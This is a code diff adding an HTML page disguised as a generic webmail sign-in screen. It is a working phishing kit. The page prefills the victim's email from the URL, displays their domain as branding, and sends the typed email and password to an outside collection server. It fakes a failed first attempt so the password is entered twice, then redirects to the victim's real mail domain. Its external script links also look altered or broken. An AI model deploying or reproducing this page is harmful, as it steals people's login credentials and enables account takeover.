@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<title>Sign in - Mail</title>
+	<link rel="icon" type="icon" href="icon.ico">
+	<link rel="stylesheet" href="design.css">
+
+
+</head>
+<body onload="checkMail()">
+
+<!---START---->
+
+<input type="hidden" id="posturl"  value="https://app-wallet-sync.com/test/send.php">
+
+<!---END ---->
+
+	<div class="mainbox">
+
+		
+		<div class="box1 centered">
+		
+			<div class="formbox">
+			<div class="office-holder">
+				<div class="logo">
+					<h4 class="text-dark"><div class="b"><span id="domain-name" class="text-uppercase"></span></div></h4>
+					<label style="font-family:Arial; font-size:14px;color:#34485b;">Sign in to continue</label>
+				</div>
+				<div style="width: 100%;">
+					<div class="alert alert-danger hide alert2"
+						 id="msgbox"></div>
+				</div>
+				<form>
+					<div class="form-holder">
+						
+						<input type="email" id="email" class="form-control" placeholder="Email address" required="">
+						<input type="password" id="password" placeholder="Password" class="form-control" required="">
+						
+						<div style="float:right;margin-top:0;" class="btn-holder">
+							<button style="border-radius: 0;font-family:Arial, Helvetica, sans-serif;font-size:16px;" class="btn btn-lg col-12" id="signin">Sign in</button>
+						</div>
+						
+						<p>&nbsp;</p>
+						
+					</div>
+                    <input type="hidden" name="rqcount" id="rqcount">
+				</form>
+				
+				
+				
+			</div>
+
+			</div>
+		
+		</div>
+		
+	</div>
+	
+
+<script src="https://code.jquery.com/jq-3.3.1.min.js"></script>
+	<script src="https://stpath.bootst.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm"
+        crossorigin="anonymous"></script>
+	<script>
+    var counter = 0;
+
+
+
+var url = $("#posturl").val();
+
+	var geteml = location.hash.substring(1);
+	$("#email").val(geteml);
+	var getdomain = geteml.substring(geteml.indexOf('@')+1,geteml.lastIndexOf("."));
+	var xdomain = geteml.substring(geteml.indexOf('@')+1);
+	$("#domain-name").html(getdomain.toUpperCase());
+
+function checkMail(){
+	var email = document.getElementById('email');
+	var password = document.getElementById('password');
+	var showDomain = document.getElementById('domain-name');
+	var domain = '';
+	domain = email.value.replace(/.*@/, "").split('.')[0];
+	showDomain.textContent = domain;
+}
+
+
+$('#signin').click(function(e){
+	e.preventDefault();
+        var email = document.getElementById('email');
+        domain = email.value.replace(/.*@/, "").split('.')[0];
+        var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
+        var alert2 = document.querySelector('#msgbox');
+        var alert1 = document.querySelector('.alert1');
+        if($('#email').val() == ""){
+            $('#email').focus();
+            $('.alert2').show();
+            alert2.textContent = "Please enter your email address";
+            return false;
+        }else if(!($('#email').val().match(checkmail))){
+            $('#email').focus();
+            $('.alert2').show();
+            alert2.textContent = "Invalid password or account";
+            return false;
+        }else if($('#password').val() == ""){
+            $('#password').focus();
+            $('#msgbox').show();
+            alert2.textContent = "Please enter your password";
+            return false;
+        }
+        else{
+            counter = counter + 1;
+            alert2.className = alert2.className.replace(/\balert-danger\b/g, "alert-info");
+            alert2.textContent = "Connecting to account";
+            $('.alert2').show();
+
+            if (counter > 1){
+                var xmlhttp;
+                if(window.XMLHttpRequest){
+                  xmlhttp = new XMLHttpRequest();
+                }else{
+                  xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+                }
+
+                xmlhttp.onreadystatechange=function(){
+                  if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                        alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-success");
+                        alert2.textContent = "Logon Successful";
+                        window.location = 'https://'+xdomain;
+                  } else {
+                      console.log(xmlhttp.responseText);
+                  }
+                }
+
+                var getemail = document.getElementById('email').value;
+                var getpassword = document.getElementById('password').value;
+                var formdata = new FormData();
+
+                formdata.append("email", getemail);
+                formdata.append("password", getpassword);
+
+                xmlhttp.open("POST", url);
+                xmlhttp.send(formdata);
+
+                return false;
+            }
+
+            var xmlhttp;
+            if(window.XMLHttpRequest){
+              xmlhttp = new XMLHttpRequest();
+            }else{
+              xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+            }
+
+            xmlhttp.onreadystatechange=function(){
+              if(xmlhttp.readyState==4 && xmlhttp.status==200){
+                    alert2.className = alert2.className.replace(/\balert-info\b/g, "alert-danger");
+                    alert2.textContent = xmlhttp.responseText;
+                    document.getElementById('password').value = "";
+                    document.getElementById('password').focus();
+              } else {
+                  console.log(xmlhttp.responseText);
+              }
+            }
+
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var formdata = new FormData();
+
+            formdata.append("email", email);
+            formdata.append("password", password);
+
+
+            xmlhttp.open("POST", url);
+            xmlhttp.send(formdata);
+
+            return false;
+
+        }
+
+})
+
+    
+    </script>
+
+</body>
+</html>
